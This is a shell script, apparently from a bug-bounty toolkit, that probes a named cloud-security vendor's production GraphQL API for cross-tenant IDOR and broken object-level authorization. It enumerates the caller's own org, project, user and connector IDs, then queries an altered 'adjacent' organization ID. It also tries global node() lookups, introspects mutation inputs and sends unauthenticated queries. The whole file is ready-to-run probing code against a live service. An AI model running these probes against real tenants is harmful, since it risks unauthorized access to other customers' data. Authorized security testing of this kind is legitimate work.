#!/usr/bin/env zsh
# GraphQL IDOR / cross-tenant isolation tests — wiz.io
# Requires JWT from trial account and a known object ID from a DIFFERENT tenant
# Usage: JWT="eyJ..." TENANT_ID="<your-tenant-id>" zsh graphql-idor-wiz.sh
#
# How to get TENANT_ID from browser DevTools:
#   1. Open app.wiz.io → DevTools → Network → any GraphQL request
#   2. Look for "organizationId" or "tenantId" in request/response body
#   3. Also look at JWT payload (base64 decode middle segment)

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

if [ -z "$JWT" ]; then
  echo "Usage: JWT='eyJ...' zsh $0"
  exit 1
fi

RESULTS=~/bug-bounty-hunting-/results/wiz.io/03-vulns
mkdir -p "$RESULTS"

GQL_API="https://api.us1.app.wiz.io/graphql"

gql() {
  curl -sk --connect-timeout 15 -X POST "$GQL_API" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $JWT" \
    -d "$1" 2>/dev/null
}

# ---------------------------------------------------------------
# Phase 1: Discover your own tenant's object IDs
# ---------------------------------------------------------------
echo "=== STEP 1: Get your own tenant IDs (save these) ==="

echo ""
echo "--- Your organization ---"
gql '{"query":"{ organizations { id name subscriptionTier createdAt } }"}' \
  | python3 -m json.tool 2>/dev/null | tee "$RESULTS/own-org.json" | head -30

echo ""
echo "--- Your projects ---"
gql '{"query":"{ projects(first: 10) { nodes { id name slug } } }"}' \
  | python3 -m json.tool 2>/dev/null | tee "$RESULTS/own-projects.json" | head -40

echo ""
echo "--- Your users ---"
gql '{"query":"{ users(first: 10) { nodes { id email name role { id name } } } }"}' \
  | python3 -m json.tool 2>/dev/null | tee "$RESULTS/own-users.json" | head -40

echo ""
echo "--- Your connectors (cloud integrations) ---"
gql '{"query":"{ connectors(first: 10) { nodes { id name type status } } }"}' \
  | python3 -m json.tool 2>/dev/null | tee "$RESULTS/own-connectors.json" | head -40

echo ""
echo "--- Your issues (cloud security findings) ---"
gql '{"query":"{ issues(first: 5, filterBy: {severity: [CRITICAL]}) { nodes { id title severity createdAt } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -40

# ---------------------------------------------------------------
# Phase 2: Extract a global-style ID from your tenant
# IDs in Wiz are typically UUIDs. Try accessing with UUID manipulation.
# ---------------------------------------------------------------
echo ""
echo "=== STEP 2: ID structure analysis ==="
# Extract your org ID
OWN_ORG_ID=$(python3 -c "
import json
d = json.load(open('$RESULTS/own-org.json'))
orgs = d.get('data',{}).get('organizations',[])
if orgs: print(orgs[0]['id'])
" 2>/dev/null)
echo "Your org ID: $OWN_ORG_ID"

# UUID manipulation: increment last byte to probe adjacent tenants
if [ -n "$OWN_ORG_ID" ]; then
  # UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
  # Try ID with last character changed
  PROBE_ID="${OWN_ORG_ID%?}0"  # change last char to 0
  echo ""
  echo "--- Probing adjacent org ID: $PROBE_ID ---"
  gql "{\"query\":\"{ organization(id: \\\"$PROBE_ID\\\") { id name } }\"}" \
    | python3 -m json.tool 2>/dev/null | head -15
fi

# ---------------------------------------------------------------
# Phase 3: Direct node access (Relay-style global IDs)
# ---------------------------------------------------------------
echo ""
echo "=== STEP 3: node(id:) global lookup ==="
# Some GraphQL APIs expose a root `node(id: ...)` query that
# bypasses tenant scoping — test with your own IDs first
OWN_PROJECT_ID=$(python3 -c "
import json
d = json.load(open('$RESULTS/own-projects.json'))
nodes = d.get('data',{}).get('projects',{}).get('nodes',[])
if nodes: print(nodes[0]['id'])
" 2>/dev/null)

if [ -n "$OWN_PROJECT_ID" ]; then
  echo "--- node() lookup with own project ID (should work) ---"
  gql "{\"query\":\"{ node(id: \\\"$OWN_PROJECT_ID\\\") { id __typename ... on Project { name slug } } }\"}" \
    | python3 -m json.tool 2>/dev/null | head -20
fi

# ---------------------------------------------------------------
# Phase 4: Test mutations without scoping — IDOR via mutation
# ---------------------------------------------------------------
echo ""
echo "=== STEP 4: Mutation IDOR surface ==="
# Check if mutations expose tenant-scoped object IDs
# Only checking schema — NOT executing mutations
gql '{"query":"{ __type(name: \"UpdateProjectInput\") { inputFields { name type { name kind ofType { name } } } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -30

gql '{"query":"{ __type(name: \"UpdateConnectorInput\") { inputFields { name type { name kind ofType { name } } } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -30

# ---------------------------------------------------------------
# Phase 5: Subscription endpoint check (real-time events)
# ---------------------------------------------------------------
echo ""
echo "=== STEP 5: Subscription endpoint (WebSocket) ==="
# Check if subscription endpoint leaks cross-tenant events
echo "Subscription endpoint (ws://):"
gql '{"query":"{ __schema { subscriptionType { name fields { name } } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -20

# ---------------------------------------------------------------
# Phase 6: Unauthenticated / BOLA probes
# ---------------------------------------------------------------
echo ""
echo "=== STEP 6: BOLA — access without auth ==="
# Try same queries without Authorization header
NO_AUTH='{"query":"{ organizations { id name } }"}'
curl -sk --connect-timeout 10 -X POST "$GQL_API" \
  -H "Content-Type: application/json" \
  -d "$NO_AUTH" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -15

echo ""
echo "=== COMPLETE ==="
echo "Review: $RESULTS/own-org.json, own-projects.json, own-users.json"
echo "Next: Compare IDs across tenants if you have 2 trial accounts"
